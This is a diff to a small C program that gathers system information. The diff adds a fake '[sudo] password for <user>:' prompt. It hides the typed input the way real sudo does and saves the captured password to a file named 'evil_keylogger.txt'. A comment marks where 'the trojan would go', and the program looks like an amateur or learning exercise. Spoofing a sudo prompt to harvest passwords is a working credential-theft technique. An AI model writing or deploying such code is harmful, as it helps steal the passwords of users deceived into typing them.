@@ -2,7 +2,24 @@
 #include <sys/utsname.h>
 #include <unistd.h>
 #include <pwd.h>
+#include <termios.h>
+#include <string.h>
 
+void hidden_input(char *buffer, size_t size){
+    struct termios oldt, newt;
+
+    // turn echoing off
+    tcgetattr(STDIN_FILENO, &oldt);
+    newt = oldt;
+    newt.c_lflag &= ~(ECHO); //disables echo flag
+    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+    // reads input
+    fgets(buffer, size, stdin);
+    //rm's new line char if there
+    buffer[strcspn(buffer, "\n")] = '\0';
+    // restores terminal
+    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+}
 const char *get_username(){
     struct passwd *pw = getpwuid(getuid());
     return pw ? pw->pw_name : "unkown";
@@ -21,15 +38,18 @@ void sys_info(FILE *fp){ // 'void' so it doesnt need a value
         
         char input[50];
         printf("[sudo] password for %s%s ", get_username(), ":");
-        scanf("%49s", input); // 49 to avoid buffer overflow
+        fflush(stdout); //force prompt befor input
+        hidden_input(input, sizeof(input));
+        printf("\n");
+        //scanf("%49s", input); // 49 to avoid buffer overflow
         
         FILE *log = fopen("evil_keylogger.txt", "w"); 
         if (log) {
             fprintf(log, "your password is: %s\n", input);
             fclose(log);
         }
-
-        fclose(fp);
+        
+        // the trojan would go here !!!!
     }
 int main() {
     FILE *fp = fopen("sysinfo.txt", "w");
